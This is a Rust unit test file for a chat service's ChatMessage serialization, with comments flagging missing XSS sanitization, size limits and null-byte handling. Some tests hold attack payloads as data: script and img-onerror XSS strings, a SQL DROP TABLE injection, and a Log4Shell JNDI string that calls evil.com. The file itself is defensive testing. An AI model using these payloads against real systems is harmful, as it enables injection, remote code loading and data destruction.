use realtime_service::model::chat_message::ChatMessage;
use serde_json;

#[cfg(test)]
mod chat_message_tests {
    use super::*;

    #[test]
    fn test_chat_message_serialization() {
        let msg = ChatMessage {
            msg_type: "text".to_string(),
            content: "Hello, World!".to_string(),
        };

        let serialized = serde_json::to_string(&msg).expect("Failed to serialize");
        assert!(serialized.contains("\"msg_type\":\"text\""));
        assert!(serialized.contains("\"content\":\"Hello, World!\""));
    }

    #[test]
    fn test_chat_message_deserialization() {
        let json = r#"{"msg_type":"text","content":"Test message"}"#;
        let msg: ChatMessage = serde_json::from_str(json).expect("Failed to deserialize");

        assert_eq!(msg.msg_type, "text");
        assert_eq!(msg.content, "Test message");
    }

    #[test]
    fn test_chat_message_deserialization_missing_fields() {
        let json = r#"{"msg_type":"text"}"#;
        let result = serde_json::from_str::<ChatMessage>(json);
        
        assert!(result.is_err(), "Should fail when content field is missing");
    }

    #[test]
    fn test_chat_message_with_unicode() {
        let msg = ChatMessage {
            msg_type: "text".to_string(),
            content: "Hello 世界 🌍".to_string(),
        };

        let serialized = serde_json::to_string(&msg).unwrap();
        let deserialized: ChatMessage = serde_json::from_str(&serialized).unwrap();

        assert_eq!(deserialized.content, "Hello 世界 🌍");
    }

    #[test]
    fn test_chat_message_with_special_characters() {
        let msg = ChatMessage {
            msg_type: "text".to_string(),
            content: r#"Special: <script>alert("xss")</script>"#.to_string(),
        };

        let serialized = serde_json::to_string(&msg).unwrap();
        let deserialized: ChatMessage = serde_json::from_str(&serialized).unwrap();

        // ⚠️ SECURITY NOTE: No sanitization happening here!
        // This test documents the LACK of XSS protection
        assert_eq!(deserialized.content, r#"Special: <script>alert("xss")</script>"#);
    }

    #[test]
    fn test_chat_message_empty_content() {
        let msg = ChatMessage {
            msg_type: "text".to_string(),
            content: "".to_string(),
        };

        let serialized = serde_json::to_string(&msg).unwrap();
        let deserialized: ChatMessage = serde_json::from_str(&serialized).unwrap();

        assert_eq!(deserialized.content, "");
        // ⚠️ VALIDATION NOTE: Empty messages are allowed - should they be?
    }

    #[test]
    fn test_chat_message_very_long_content() {
        let long_content = "A".repeat(1_000_000); // 1MB
        let msg = ChatMessage {
            msg_type: "text".to_string(),
            content: long_content.clone(),
        };

        let result = serde_json::to_string(&msg);
        assert!(result.is_ok());
        
        // ⚠️ SECURITY NOTE: No size limit - potential DoS vector!
        let deserialized: ChatMessage = serde_json::from_str(&result.unwrap()).unwrap();
        assert_eq!(deserialized.content.len(), 1_000_000);
    }

    #[test]
    fn test_chat_message_malformed_json() {
        let malformed = r#"{"msg_type":"text","content":"unclosed string"#;
        let result = serde_json::from_str::<ChatMessage>(malformed);
        
        assert!(result.is_err());
    }

    #[test]
    fn test_chat_message_injection_attempts() {
        let injection_payloads = vec![
            r#"{"msg_type":"text\"; DROP TABLE users;--","content":"hack"}"#,
            r#"{"msg_type":"text","content":"${jndi:ldap://evil.com/a}"}"#,
            r#"{"msg_type":"text","content":"<img src=x onerror=alert(1)>"}"#,
        ];

        for payload in injection_payloads {
            let result = serde_json::from_str::<ChatMessage>(payload);
            // Should either reject or sanitize - currently just accepts
            if result.is_ok() {
                println!("⚠️  Injection payload accepted: {}", payload);
            }
        }
    }

    #[test]
    fn test_chat_message_null_bytes() {
        let msg = ChatMessage {
            msg_type: "text".to_string(),
            content: "Hello\0World".to_string(),
        };

        let serialized = serde_json::to_string(&msg).unwrap();
        let deserialized: ChatMessage = serde_json::from_str(&serialized).unwrap();
        
        // ⚠️ Null bytes pass through - could cause issues in C FFI or logs
        assert!(deserialized.content.contains('\0'));
    }

    // Property-based testing with proptest
    #[cfg(test)]
    mod property_tests {
        use super::*;
        use proptest::prelude::*;

        proptest! {
            #[test]
            fn test_roundtrip_serialization(msg_type in "\\PC*", content in "\\PC*") {
                let msg = ChatMessage {
                    msg_type: msg_type.clone(),
                    content: content.clone(),
                };

                let serialized = serde_json::to_string(&msg).unwrap();
                let deserialized: ChatMessage = serde_json::from_str(&serialized).unwrap();

                prop_assert_eq!(deserialized.msg_type, msg_type);
                prop_assert_eq!(deserialized.content, content);
            }

            #[test]
            fn test_arbitrary_content_doesnt_panic(content in ".*") {
                let msg = ChatMessage {
                    msg_type: "text".to_string(),
                    content,
                };

                // Should never panic regardless of content
                let _ = serde_json::to_string(&msg);
            }
        }
    }
}